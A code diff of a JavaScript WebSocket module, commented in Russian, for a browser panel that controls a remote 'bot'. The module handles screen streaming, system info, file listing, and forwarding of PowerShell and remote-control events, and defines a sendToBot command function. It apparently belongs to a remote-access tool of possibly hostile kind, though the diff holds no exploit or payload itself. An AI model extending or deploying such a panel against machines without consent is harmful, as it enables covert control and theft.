@@ -1,5 +1,7 @@
 // frontend\client_control\js\modules\websocket\connection.js
 
+// frontend\client_control\js\modules\websocket\connection.js
+
 import { AppState } from '../core/states.js';
 import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
 import { renderScreenRGBA } from '../features/screen_renderer.js';
@@ -7,7 +9,6 @@ import { renderScreenRGBA } from '../features/screen_renderer.js';
 let socket = null;
 const $ = id => document.getElementById(id);
 
-// Универсальное обновление текста в UI
 const ui = (id, val) => { if ($(id)) $(id).textContent = val ?? '...'; };
 
 /**
@@ -15,32 +16,35 @@ const ui = (id, val) => { if ($(id)) $(id).textContent = val ?? '...'; };
  */
 const handleIncomingData = (buf) => {
     const pkg = decodePacket(buf);
-    if (!pkg) return;
+    
+    if (!pkg) return; // Молча выходим, если пакет битый
 
     const { module, type, action, payload } = pkg;
 
     switch (module) {
         case 'ScreenView':
             if (action === 'STOP') return window.resetRenderer?.();
-            if (type === 'bin') return renderScreenRGBA(payload);
+            // Рендерим только бинарные данные видеопотока
+            if (type === 'bin' && action === 'DATA') return renderScreenRGBA(payload);
             break;
 
         case 'SystemInfo':
             if (payload?.ip) ui('display-ip', payload.ip);
             if (payload?.id) ui('display-id', payload.id);
-            // Вызываем глобальный метод из header.js для синхронизации кнопок
             if (payload?.status) window.updateBotStatus?.(payload.status);
             break;
 
         case 'FileManager':
             if (action === 'LIST' && window.renderFileSystem) {
-                window.renderFileSystem(payload);
+                window.renderFileSystem(payload, pkg);
+            } else {
+                // DT_START, DT_DATA и прочие события файлового менеджера
+                window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: pkg }));
             }
             break;
 
         default:
-            // Для терминала и прочих модулей
-            // Передаем весь объект pkg, чтобы были доступны action, extra и payload
+            // Универсальная пересылка для остальных модулей (Powershell, RemoteControl и т.д.)
             window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: pkg }));
     }
 };
@@ -60,27 +64,30 @@ export const initControlConnection = () => {
     socket = new WebSocket(url);
     socket.binaryType = 'arraybuffer';
     
-    // Используем единую точку входа для статуса
     socket.onopen = () => window.updateBotStatus?.('online');
     socket.onclose = () => window.updateBotStatus?.('offline');
     socket.onmessage = (e) => handleIncomingData(e.data);
 
     /**
-     * Глобальная функция отправки (Формула: MOD:TYPE:ACT:EXTRA)
+     * Глобальная функция отправки команд боту
      */
     window.sendToBot = (modName, pay, action = 'DATA', extra = 'none') => {
-        if (socket?.readyState !== 1) return;
+        if (!socket || socket.readyState !== 1) return;
 
         let type = 'str';
-        if (pay instanceof ArrayBuffer || pay instanceof Uint8Array) type = 'bin';
-        else if (typeof pay === 'object' && pay !== null) type = 'json';
+        if (pay instanceof ArrayBuffer || pay instanceof Uint8Array) {
+            type = 'bin';
+        } else if (typeof pay === 'object' && pay !== null) {
+            type = 'json';
+        }
         
-        // LIST всегда требует JSON
+        // Специфическая обработка для навигации
         if (action === 'LIST') {
             type = 'json';
             pay = pay || {}; 
         }
 
-        socket.send(encodePacket(tid, modName, type, action, extra, pay));
+        const encoded = encodePacket(tid, modName, type, action, extra, pay);
+        socket.send(encoded);
     };
 };
